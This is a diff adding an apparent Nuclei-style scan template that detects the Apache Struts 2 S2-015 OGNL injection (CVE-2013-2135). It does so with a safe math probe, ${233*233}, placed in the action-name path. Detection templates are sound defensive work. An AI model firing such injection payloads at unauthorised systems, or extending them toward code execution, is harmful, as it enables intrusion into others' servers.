@@ -1,0 +1,33 @@
+id: local-struts2-s2-015-math
+
+info:
+  name: Struts2 S2-015 OGNL Injection via Wildcard Action Name (CVE-2013-2135)
+  author: pentest-platform
+  severity: critical
+  description: |
+    Apache Struts 2 S2-015 (CVE-2013-2135) allows OGNL injection via wildcard
+    action name matching. When an action mapping uses <action name="*">, the
+    requested action name is used as {1} in the result path and evaluated as an
+    OGNL expression due to double evaluation in TextParseUtil.translateVariables.
+    Safe math probe embeds ${233*233} in the action name path segment; 54289
+    appears in the response body.
+  reference:
+    - https://cwiki.apache.org/confluence/display/WW/S2-015
+    - https://nvd.nist.gov/vuln/detail/CVE-2013-2135
+  tags: safe-poc,struts2,s2-015,cve,cve2013,ognl,rce
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/%24%7B233*233%7D.action"
+      - "{{BaseURL}}/S2-015/%24%7B233*233%7D.action"
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "54289"
+      - type: status
+        status:
+          - 404
